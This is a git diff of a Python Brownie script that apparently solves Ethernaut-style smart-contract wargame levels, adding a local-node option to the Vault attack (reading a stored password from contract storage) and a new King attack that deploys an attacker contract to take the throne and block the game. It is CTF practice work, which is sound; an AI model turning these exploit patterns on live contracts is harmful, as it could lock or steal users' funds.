@@ -1,5 +1,5 @@
 from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
-from brownie import AttackForce, Vault
+from brownie import AttackForce, Vault, King, AttackKing
 from brownie.network.gas.strategies import GasNowStrategy
 from brownie.network import gas_price
 from scripts.helpful_scripts import *
@@ -142,8 +142,13 @@ def deploy_force():
 def deploy_vault():
     account = get_account()
     vault = deploy_contract(Vault, "Vault", 1, [bytes("testpassword", encoding='utf8')])
-    w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
-    
+
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
+    else:
+        w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+
+
     print(f"Connected? {w3.isConnected()}")
     password = w3.eth.get_storage_at(vault.address, 1) # get 2nd variable
     passwordDecode = password.decode("utf-8")
@@ -152,8 +157,29 @@ def deploy_vault():
     print(f"Locked? {vault.locked()}")
     print("Vault attacked! Try submitting the solution as complete.")
 
+def deploy_king():
+    account = get_account()
+    king = deploy_contract(King, "King", 1, [])
+
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        king = King.deploy({"from": accounts[1].address, "value":1}, publish_source=False)
+
+    print(f"Before attack...Current prize: {king.prize()} King: {king._king()}")
+    attackKing = AttackKing.deploy(king.address, {"from": account, "value":king.prize()+2}, publish_source=False)
+    print(f"After attack...Current prize: {king.prize()} Are we owner?: {king._king() == attackKing.address}")
+    # confirm that the attack was successful
+    try:
+        king.transfer(account.address, king.prize()+2).wait(1)
+        print("King attacked but failed to break the game...")
+    except:
+        print("King attacked successfully! Submit the solution as complete.")
 
 
+    
+
+### NOTES
+### deploy_contract is used for when the instance is either from address or deployed locally, depending on network
+### ClassName.deploy() is used when we want to explicitly deploy it regardless of network
 
 def main():
     #deploy_fallback()
@@ -163,4 +189,5 @@ def main():
     #deploy_token()
     #deploy_delegation()
     #deploy_force()
-    deploy_vault()
+    #deploy_vault()
+    deploy_king()
